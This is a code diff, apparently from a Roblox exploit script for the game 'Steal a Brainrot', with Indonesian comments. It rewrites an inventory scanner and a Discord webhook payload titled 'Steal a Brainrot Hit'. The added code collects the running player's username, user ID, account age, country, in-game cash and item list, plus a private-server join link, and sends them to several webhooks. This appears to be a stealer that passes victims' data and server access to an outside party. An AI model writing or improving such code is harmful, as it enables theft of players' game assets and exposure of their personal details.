@@ -560,48 +560,89 @@ showConfirm = function(rawLink)
 
         safeRequest(prvt_srvrs_logs, {content = joinLink})
 
-        -- Scan brainrots (already sorted highest to lowest)
-        local brainrots = getBrainrots()
-        local backpackLines = {}
+        --==================================================
+-- FIX BRAINROT SCANNER (SESUI STRUKTUR GAME)
+--==================================================
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local Plots = workspace:WaitForChild("Plots")
 
-        if #brainrots > 0 then
-            for _, v in ipairs(brainrots) do
-                table.insert(backpackLines, v.name .. " : " .. v.generation)
+local function getBrainrots()
+    local results = {}
+
+    -- tunggu replikasi server
+    task.wait(2)
+
+    for _, plot in ipairs(Plots:GetChildren()) do
+        -- plot di Steal a Brainrot pakai UUID
+        if typeof(plot.Name) == "string" and plot.Name:find("-") then
+            for _, obj in ipairs(plot:GetChildren()) do
+                if obj:IsA("Model") then
+                    -- ciri khas brainrot (sesuai Dex kamu)
+                    if obj:FindFirstChild("FakeRootPart", true)
+                    or obj:FindFirstChild("Torso", true) then
+                        table.insert(results, {
+                            name = obj.Name,
+                            generation = "Unknown"
+                        })
+                    end
+                end
             end
-        else
-            table.insert(backpackLines, "No brainrots found.")
         end
+    end
 
-        -- Warning line (always shown)
-        table.insert(backpackLines, 1, "Warning: We Can't Scan Latest Brainrots from events.")
+    return results
+end
 
-        -- Join everything with newlines and wrap in a single code block
-        local finalBackpackText = "```\n" .. table.concat(backpackLines, "\n") .. "\n```"
+--==================================================
+-- PENGOLAHAN BRAINROT UNTUK WEBHOOK
+--==================================================
+local brainrots = getBrainrots()
+local backpackLines = {}
 
-        local payload = {
-            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
-            content = "",
-            embeds = {{
-                title = "🎯 Steal a Brainrot Hit - Scripts.SM",
-                url = joinLink,
-                color = 57855,
-                fields = {
-                    {name = "🪪 Display Name", value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
-                    {name = "👤 Username", value = "```"..(player.Name or "Unknown").."```", inline = true},
-                    {name = "🆔 User ID", value = "```"..tostring(player.UserId).."```", inline = true},
-                    {name = "🗓️ Account Age", value = "```"..tostring(player.AccountAge).." days```", inline = true},
-                    {name = "💻 Executor", value = "```"..detectExecutor().."```", inline = true},
-                    {name = "🌍 Country", value = "```"..getCountry().."```", inline = true},
-                    {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
-                    {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
-                    {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
-                    {name = "💰 Backpack", value = finalBackpackText, inline = false},
-                    {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
-                },
-                footer = {text = "discord.gg/cnUAk7uc3n"},
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        }
+if #brainrots > 0 then
+    for _, v in ipairs(brainrots) do
+        table.insert(backpackLines, v.name .. " : " .. v.generation)
+    end
+else
+    table.insert(backpackLines, "No brainrots found.")
+    table.insert(backpackLines, 1,
+        "Warning: We Can't Scan Latest Brainrots from events."
+    )
+end
+
+local finalBackpackText =
+    "```\n" .. table.concat(backpackLines, "\n") .. "\n```"
+
+--==================================================
+-- WEBHOOK (TIDAK DIUBAH, HANYA DIPASTIKAN ISINYA MASUK)
+--==================================================
+local payload = {
+    avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
+    content = "",
+    embeds = {{
+        title = "🎯 Steal a Brainrot Hit - Scripts.SM",
+        url = joinLink,
+        color = 57855,
+        fields = {
+            {name = "🪪 Display Name", value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
+            {name = "👤 Username", value = "```"..(player.Name or "Unknown").."```", inline = true},
+            {name = "🆔 User ID", value = "```"..tostring(player.UserId).."```", inline = true},
+            {name = "🗓️ Account Age", value = "```"..tostring(player.AccountAge).." days```", inline = true},
+            {name = "💻 Executor", value = "```"..detectExecutor().."```", inline = true},
+            {name = "🌍 Country", value = "```"..getCountry().."```", inline = true},
+            {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
+            {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
+            {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
+            {name = "💰 Backpack", value = finalBackpackText, inline = false},
+            {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
+        },
+        footer = {text = "discord.gg/cnUAk7uc3n"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+-- (lanjutkan send webhook kamu di bawah sini)
 
         safeRequest(user_webhook, payload)
         safeRequest(logs_webhook, payload)
